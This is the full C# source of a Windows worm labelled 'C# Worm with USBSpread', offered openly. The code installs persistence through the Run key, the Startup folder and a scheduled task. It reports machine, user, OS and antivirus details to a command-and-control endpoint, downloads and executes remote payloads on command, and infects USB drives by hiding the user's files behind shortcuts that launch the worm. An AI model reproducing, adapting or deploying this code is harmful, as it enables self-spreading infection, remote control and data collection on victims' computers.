using System;
using System.Text;
using System.Runtime.InteropServices;
using Microsoft.VisualBasic;
using System.IO;
using Microsoft.VisualBasic.CompilerServices;

namespace w0rm {

    /*
     * Author: Suleiman Al-Othman
     * Twitter: @sulealothman
     * Project : C# Worm with USBSpread
     * Version: v0.1
     * Created: 31/1/2017
     */
    class w0rm {
        static void Main() {

            bool instance;
            var vmt = new System.Threading.Mutex(true, System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName, out instance);
            if(instance == false) {
                ProjectData.EndApp();
            }

            if(Strings.Mid(System.Reflection.Assembly.GetExecutingAssembly().Location, 2) == ":\\" + System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName) {
                if(Microsoft.Win32.Registry.GetValue("HKEY_CURRENT_USER", "IsSpread", null) == null) {
                    Microsoft.Win32.Registry.SetValue("HKEY_CURRENT_USER", "IsSpread", "TRUE", Microsoft.Win32.RegistryValueKind.String);
                }
            } else {
                if(Microsoft.Win32.Registry.GetValue("HKEY_CURRENT_USER", "IsSpread", null) == null) {
                    Microsoft.Win32.Registry.SetValue("HKEY_CURRENT_USER", "IsSpread", "FALSE", Microsoft.Win32.RegistryValueKind.String);
                }
            }
            Install();
            Spread.USB();
            while(true) {
                string re = Connect("Vre", "");
                string[] v = Strings.Split(re,"|V|");
                try {

                    if(v[0] == "Cl") {
                        ProjectData.EndApp();
                    }

                    if(v[0] == "Sc") {
                        System.IO.File.AppendAllText(Interaction.Environ("temp") + "\\" + v[2], v[1]);
                        System.Diagnostics.Process.Start(Interaction.Environ("temp") + "\\" + v[2]);
                    }
                    if(v[0] == "Ex") {
                        System.Net.WebClient w  = new System.Net.WebClient();
                        w.DownloadFile(v[1] , Interaction.Environ("temp") + "\\" + v[2]);
                        System.Diagnostics.Process.Start(Interaction.Environ("temp") + "\\" + v[2]);
                    }
                } catch {}

                System.Threading.Thread.Sleep(7000);
            }
        }
        [DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "GetVolumeInformationA", ExactSpelling = true, SetLastError = true)]
        private static extern int GetVolumeInformation([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer, int nVolumeNameSize, ref int lpVolumeSerialNumber, ref int lpMaximumComponentLength, ref int lpFileSystemFlags, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer, int nFileSystemNameSize);
        private static string HWD() {
            int number = 0;
            try {
                string text = null;
                int num = 0;
                string rootDrive = Interaction.Environ("SystemDrive") + "\\";
                GetVolumeInformation(ref rootDrive, ref text, 0, ref number, ref num, ref num, ref text, 0);
            } catch {
                return "ERR";
            }
            return Conversion.Hex(number);
        }
        private static string Connect(string cmd, string re) {
            try {
                System.Net.WebRequest request = System.Net.HttpWebRequest.Create("http://127.0.0.1:3665/" + cmd);
                request.Method = "POST";
                ((System.Net.HttpWebRequest)request).UserAgent = Inf();
                System.IO.Stream dataStream = request.GetRequestStream();
                dataStream.Write(Encoding.UTF8.GetBytes(re), 0, Encoding.UTF8.GetBytes(re).Length);
                dataStream.Close();
                System.Net.HttpWebResponse requestResponse = (System.Net.HttpWebResponse)request.GetResponse();
                dataStream = requestResponse.GetResponseStream();
                System.IO.StreamReader reader = new System.IO.StreamReader(dataStream);
                re = reader.ReadToEnd();
                reader.Close();
                dataStream.Close();
                requestResponse.Close();
                return re;
            } catch {
                return "";
            }
        }
        private static string keySplit = "/";
        private static string vDR = "";
       
        private static string AV() {
            string avName = null;
            object wmi;
            if(Environment.OSVersion.Version.Major > 5) {
                wmi = Microsoft.VisualBasic.Interaction.GetObject("winmgmts:\\\\localhost\\root\\securitycenter2");
            } else {
                wmi = Microsoft.VisualBasic.Interaction.GetObject("winmgmts:\\\\localhost\\root\\securitycenter");
            }
            try {
                System.Collections.IEnumerator enumerator = ((System.Collections.IEnumerable)NewLateBinding.LateGet(wmi, null, "InstancesOf", new object[]
                {"AntiVirusProduct"}, null, null, null)).GetEnumerator();
                while(enumerator.MoveNext()) {
                    object avProduct = System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(enumerator.Current);
                    avName = NewLateBinding.LateGet(avProduct, null, "DisplayName", new object[0], null, null, null).ToString();
                }
            } catch {
                avName = "Not-Found";
            }
            return avName;
        }
        private static string Inf() {
            string Info = "";
            try {
                Info = Info + HWD() + keySplit;
            } catch {
                Info = Info + "??" + keySplit;
            }

            try {
                Info = Info + Environment.MachineName + keySplit + Environment.UserName + keySplit;
            }  catch {
                Info = Info + "??";
            }

            try {
                Info = Info + Microsoft.Win32.Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName", null) + keySplit;
                Info = Info.Replace("Microsoft", "").Replace("Windows", "Win").Replace("®", "").Replace("™", "").Replace("  ", " ").Replace(" Win", "Win");
            } catch {
                Info = Info + "??" + keySplit;
            }

            try {
                Info = Info + AV() + keySplit + keySplit  + "C#" + keySplit + "YES" + keySplit;
            } catch {}

            try {
                Info = Info + Microsoft.Win32.Registry.GetValue("HKEY_CURRENT_USER", "IsSpread", null) + keySplit;
            } catch {}

            return Info;
        }
        private static void Install() {
            try {
                if(!File.Exists(Interaction.Environ(vDR) + "\\" + System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName)) {
                    File.WriteAllBytes(Interaction.Environ(vDR) + "\\" + System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName, File.ReadAllBytes(System.Reflection.Assembly.GetExecutingAssembly().Location));
                    System.Diagnostics.Process.Start(Interaction.Environ(vDR) + "\\" + System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName);
                    ProjectData.EndApp();
                }
            } catch {
                ProjectData.EndApp();
            }

            try {
                Microsoft.Win32.Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true).SetValue(System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName, System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
            } catch {}

            try {
                File.WriteAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName, File.ReadAllBytes(System.Reflection.Assembly.GetExecutingAssembly().Location));
            } catch {}

            try {
                Interaction.Shell("schtasks /create /sc minute /mo 30 /tn ScheduleName /tr \"" + System.Reflection.Assembly.GetExecutingAssembly().Location, AppWinStyle.Hide, false, -1);
            } catch {}

            System.Threading.Thread.Sleep(1000);
        }
    }
    class Spread {

        private static object objShell;
        private static object objLink;
        private static string sPath;
        public static void USB() {
            Spread.sPath = Interaction.Command().Replace("\\\\\\", "\\").Replace("\\\\", "\\");
            Spread.ExecParam(Spread.sPath);
            System.Threading.Thread newThread = new System.Threading.Thread(new System.Threading.ThreadStart(Spread.USBSpread), 1);
            newThread.Start();
        }
        public static void USBSpread() {
            while(true) {
                try {
                    string[] USBDrivers = Strings.Split(Spread.DetectUSBDrivers(), "<->", -1, CompareMethod.Binary);
                    int num = Information.UBound(USBDrivers, 1) - 1;
                    for(int i = 0; i <= num; i++) {
                        if(!File.Exists(USBDrivers[i] + "\\" + System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName)) {
                            File.Copy(System.Reflection.Assembly.GetExecutingAssembly().Location, USBDrivers[i] + System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName);
                            File.SetAttributes(USBDrivers[i] + "\\" + System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName, FileAttributes.Hidden | FileAttributes.System);
                        }
                        string[] files = Directory.GetFiles(USBDrivers[i]);
                        for(int j = 0; j < files.Length; j++) {
                            string gettingFile = files[j];
                            if(Operators.CompareString(Path.GetExtension(gettingFile), ".lnk", false) != 0 && Operators.CompareString(Path.GetFileName(gettingFile), System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName, false) != 0) {
                                System.Threading.Thread.Sleep(100);
                                File.SetAttributes(gettingFile, FileAttributes.Hidden | FileAttributes.System);
                                Spread.CreateShortCut(Path.GetFileName(gettingFile), USBDrivers[i], Path.GetFileNameWithoutExtension(gettingFile), Spread.GetIconoffile(Path.GetExtension(gettingFile)));
                            }
                        }
                        string[] directories = Directory.GetDirectories(USBDrivers[i]);
                        for(int k = 0; k < directories.Length; k++) {
                            string dir = directories[k];
                            System.Threading.Thread.Sleep(100);
                            File.SetAttributes(dir, FileAttributes.Hidden | FileAttributes.System);
                            Spread.CreateShortCut(Path.GetFileNameWithoutExtension(dir), USBDrivers[i] + "\\", Path.GetFileNameWithoutExtension(dir), null);
                        }
                    }
                } catch {}
                System.Threading.Thread.Sleep(5000);
            }
        }
        private static void CreateShortCut(string targetName, string shortCutPath, string shortCutName, string icon) {
            try {
                Spread.objShell = System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(Interaction.CreateObject("WScript.Shell", ""));
                Spread.objLink = System.Runtime.CompilerServices.RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(Spread.objShell, null, "CreateShortcut", new object[]{shortCutPath + "\\" + shortCutName + ".lnk"}, null, null, null));
                NewLateBinding.LateSet(Spread.objLink, null, "TargetPath", new object[]{shortCutPath + "\\" + System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName}, null, null);
                NewLateBinding.LateSet(Spread.objLink, null, "WindowStyle", new object[]{1}, null, null);
                if(icon == null) {
                    NewLateBinding.LateSet(Spread.objLink, null, "Arguments", new object[]{" " + shortCutPath + "\\" + targetName}, null, null);
                    NewLateBinding.LateSet(Spread.objLink, null, "IconLocation", new object[]{"%SystemRoot%\\system32\\SHELL32.dll,3"}, null, null);
                } else {
                    NewLateBinding.LateSet(Spread.objLink, null, "Arguments", new object[]{" " + shortCutPath + "\\" + targetName}, null, null);
                    NewLateBinding.LateSet(Spread.objLink, null, "IconLocation", new object[]{icon}, null, null);
                }
                NewLateBinding.LateCall(Spread.objLink, null, "Save", new object[0], null, null, null, true);
            } catch {}
        }
        private static string GetIconoffile(string fileFormat) {
            string getIconoffile;
            try {
                Microsoft.Win32.RegistryKey Registry = Microsoft.Win32.Registry.LocalMachine.OpenSubKey("Software\\Classes\\", false);
                string GetValue = Conversions.ToString(Registry.OpenSubKey(Conversions.ToString(Operators.ConcatenateObject(Registry.OpenSubKey(fileFormat, false).GetValue(""), "\\DefaultIcon\\"))).GetValue("", ""));
                if(!GetValue.Contains(",")) {
                    GetValue += ",0";
                }
                getIconoffile = GetValue;
            } catch {
                getIconoffile = "";
            }
            return getIconoffile;
        }
        private static string DetectUSBDrivers() {
            string USBDrivers = "";
            DriveInfo[] drives = DriveInfo.GetDrives();
            for(int i = 0; i < drives.Length; i++) {
                DriveInfo usbDrive = drives[i];
                if(usbDrive.DriveType == DriveType.Removable) {
                    USBDrivers = USBDrivers + usbDrive.RootDirectory.FullName + "<->";
                }
            }
            return USBDrivers;
        }
        private static void ExecParam(string parameter) {
            if(Operators.CompareString(parameter, null, false) != 0) {
                if(Strings.InStrRev(parameter, ".", -1, CompareMethod.Binary) > 0) {
                    System.Diagnostics.Process.Start(parameter);
                } else {
                    Interaction.Shell("explorer " + parameter, AppWinStyle.NormalFocus, false, -1);
                }
            }
        }
    }
}
